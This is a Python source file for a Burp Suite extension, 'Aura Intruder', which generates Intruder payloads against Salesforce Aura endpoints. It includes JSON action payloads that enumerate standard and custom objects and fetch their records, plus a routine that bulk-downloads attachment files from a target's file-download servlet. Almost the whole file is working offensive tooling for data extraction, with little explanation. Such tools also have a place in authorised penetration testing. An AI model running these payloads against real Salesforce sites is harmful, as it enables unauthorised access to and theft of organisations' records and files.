from burp import (
    IBurpExtender,
    IIntruderPayloadGeneratorFactory,
    IIntruderPayloadProcessor,
    IIntruderPayloadGenerator, 
    ITab )
from javax.swing import JPanel, JButton
from java.awt import GridLayout, Dimension

import string, json, os
from modules import urllib3

http = urllib3.PoolManager()

PAYLOADS = []

class BurpExtender(IBurpExtender, IIntruderPayloadGeneratorFactory, IIntruderPayloadProcessor, ITab):

    def getTabCaption(self):
        return "Aura Intruder"
    
    def load_recon_message(self, e):
        try:
            payload = '{"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.force.components.controllers.hostConfig.HostConfigController/ACTION$getConfigData","callingDescriptor":"UNKNOWN","params":{}}]}'
            PAYLOADS.append(bytearray(payload.strip()))
        except Exception as e:
            print(e)
    
    def load_custom_objects(self, e):
        try:
            extract_custom_object_names()
        except Exception as e:
            print(e)
 
    def load_object_payloads(self, e):
        try:
            with open('./files/Salesforce_standard_objects.txt') as apex_payloads:
                for payload in apex_payloads:
                    false = "false"
                    add_object = {"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId": payload.strip(),"layoutType":"FULL","pageSize":100,"currentPage":0,"useTimeout":false,"getCount":false,"enableRowActions":false}}]}
                    PAYLOADS.append(bytearray(json.dumps(add_object)).strip())
        except Exception as e:
            print(e)

    def start_downloading_files(self, e):
        try:
            parse_json_file_response()
        except Exception as e:
            print(e)

    def getUiComponent(self):
        panel = JPanel(GridLayout(4,4,4,4))
        recon = JButton("Salesforce Object Recon", actionPerformed = self.load_recon_message)
        recon.setPreferredSize(Dimension(40, 40))
        get_object_data = JButton("Get Salesforce standard object data", actionPerformed = self.load_object_payloads)
        get_object_data.setPreferredSize(Dimension(40, 40))
        get_custom_objects = JButton("Get custom Objects", actionPerformed = self.load_custom_objects)
        get_custom_objects.setPreferredSize(Dimension(40, 40))
        download_files = JButton("Download files from response", actionPerformed = self.start_downloading_files)
        download_files.setPreferredSize(Dimension(40, 40))
        panel.add(recon)
        panel.add(get_custom_objects)
        panel.add(get_object_data)
        panel.add(download_files)
        return panel

    # implement IBurpExtender
    
    def registerExtenderCallbacks(self, callbacks):
        # obtain an extension helpers object
        self._helpers = callbacks.getHelpers()
        
        # set our extension name
        callbacks.setExtensionName("Aura Intruder")
        
        # register ourselves as an Intruder payload generator
        callbacks.registerIntruderPayloadGeneratorFactory(self)
        
        # register ourselves as an Intruder payload processor
        callbacks.registerIntruderPayloadProcessor(self)

        # add extension tab
        callbacks.addSuiteTab(self)

    # implement IIntruderPayloadGeneratorFactory
    
    def getGeneratorName(self):
        return "Aura payloads"

    def createNewInstance(self, attack):
        # return a new IIntruderPayloadGenerator to generate payloads for this attack
        return IntruderPayloadGenerator()

    # implement IIntruderPayloadProcessor
    
    def getProcessorName(self):
        return "Serialized input wrapper"

    def processPayload(self, currentPayload, originalPayload, baseValue):
        # decode the base value
        dataParameter = self._helpers.bytesToString(
                self._helpers.base64Decode(self._helpers.urlDecode(baseValue)))
        
        # parse the location of the input string in the decoded data
        start = dataParameter.index("input=") + 6
        if start == -1:
            return currentPayload

        prefix = dataParameter[0:start]
        end = dataParameter.index("&", start)
        if end == -1:
            end = len(dataParameter)

        suffix = dataParameter[end:len(dataParameter)]
        
        # rebuild the serialized data with the new payload
        dataParameter = prefix + self._helpers.bytesToString(currentPayload) + suffix
        return self._helpers.stringToBytes(
                self._helpers.urlEncode(self._helpers.base64Encode(dataParameter)))

# classes to generate payloads from a simple list

class IntruderPayloadGenerator(IIntruderPayloadGenerator):
    def __init__(self):
        self._payloadIndex = 0

    def hasMorePayloads(self):
        return self._payloadIndex < len(PAYLOADS)

    def getNextPayload(self, baseValue):
        payload = PAYLOADS[self._payloadIndex]
        self._payloadIndex = self._payloadIndex + 1

        return payload

    def reset(self):
        self._payloadIndex = 0


# Function to parse document download json response and automagically download files from Salesforce sandbox environment

def parse_json_file_response():

    download_id_list = []
    with open('./files/json_response.json', 'r') as json_response:
        json_data = json.load(json_response)
        for line in json_data:
            download_id_list.append(line["record"]["Id"])

    for download_id in download_id_list:
        try:
            url = "https://YOUR_ATTACHMENTS_DOMAIN/sfc/servlet.shepherd/version/download/"
            r = http.request('GET', url + download_id)
            filename = r.headers.get('content-disposition').split("filename=")[1].strip('"').strip("'")
            files_path = os.path.join("./files/", filename)
            open(files_path, 'wb').write(r.content)
        except Exception as e:
            print(e)


# Extract custom objects from json response
def extract_custom_object_names():
    with open('./files/custom_object_check.json', 'r') as custom_object_check:
        json_data = json.load(custom_object_check)
        for line in json_data:
            if "__c" in line:
                print(line)